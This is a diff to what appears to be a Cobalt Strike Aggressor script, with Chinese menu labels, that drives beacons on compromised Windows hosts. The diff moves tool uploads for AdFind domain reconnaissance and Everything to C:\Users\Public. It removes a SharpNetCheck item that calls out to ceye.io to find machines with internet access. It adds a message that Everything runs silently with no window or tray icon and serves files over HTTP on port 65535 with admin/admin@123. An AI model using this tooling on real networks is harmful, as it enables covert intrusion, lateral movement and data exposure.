@@ -87,7 +87,7 @@ menu "信息搜集" {
 		menu "AdFind(查询域内信息)" {
 			item "上传AdFind" {
 				$bid = $1;
-				$dialog = dialog("上传AdFind", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &AdFind_upload);
+				$dialog = dialog("上传AdFind", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &AdFind_upload);
 				dialog_description($dialog,"AdFind用于查询域内信息。项目地址：http://www.joeware.net/freetools/tools/adfind/index.htm");
 				drow_text($dialog, "UploadPath",  "上传路径: ");
 				dbutton_action($dialog, "上传");
@@ -207,19 +207,6 @@ menu "信息搜集" {
 	    bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpChassisType.exe"), "");
 	}
 
-	item "SharpNetCheck(探测出网)" {
-		$bid = $1['@'];
-		$dialog = dialog("SharpNetCheck", %(host => "ceye.io",,type => "all",bid => $bid), &SharpNetCheck);
-		dialog_description($dialog,"在内网渗透过程中，对可以出网的机器是十分渴望的。在收集大量弱口令的情况下，一个一个去测试能不能出网太麻烦了。所以就有了这个工具，可配合如wmiexec、psexec等横向工具进行批量检测，该工具可以在dnslog中回显内网ip地址和计算机名，可实现内网中的快速定位可出网机器。项目地址：https://github.com/uknowsec/SharpNetCheck");
-		drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","all"));
-		drow_text($dialog, "host", "host/ip:  ");
-		dbutton_action($dialog, "运行");
-		dialog_show($dialog);
-	}
-	sub SharpNetCheck {
-		$arg = join(' ', @($3['type'],"-host",$3['host']));
-		bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpNetCheck.exe"), $arg);
-	}
 
 	item "SharpEventLog(获取系统登录日志)" {
 		$bid = $1;
@@ -308,7 +295,7 @@ menu "信息搜集" {
 	menu "Everything(建立http服务文件搜索)" {
 		item "上传Everything" {
 			$bid = $1;
-			$dialog = dialog("上传 Everything", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &evething);
+			$dialog = dialog("上传 Everything", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &evething);
 			dialog_description($dialog, "运行无任何弹窗，软件地址：https://www.voidtools.com/zh-cn/");
 			drow_text($dialog, "UploadPath",  "上传路径: ");
 			dbutton_action($dialog, "上传");
@@ -328,7 +315,8 @@ menu "信息搜集" {
 		item "运行Everything"{
 			$bid = $1['@'];
 			$Dialog = dialog("运行Evething",%(bid => $bid),&Evething_run);
-			dialog_description($Dialog, "运行无任何弹窗及托盘显示，自动启用http服务。端口：65536，用户：admin，密码：admin@123");
+			dialog_description($Dialog, "运行无任何弹窗及托盘显示，自动启用http服务。端口：65535，用户：admin，密码：admin@123");
+			btask($bid, "运行无任何弹窗及托盘显示，自动启用http服务。访问web服务：http://ip:65535，用户：admin，密码：admin@123", "");
 			dbutton_action($Dialog, "运行");
 			dialog_show($Dialog);
 		}
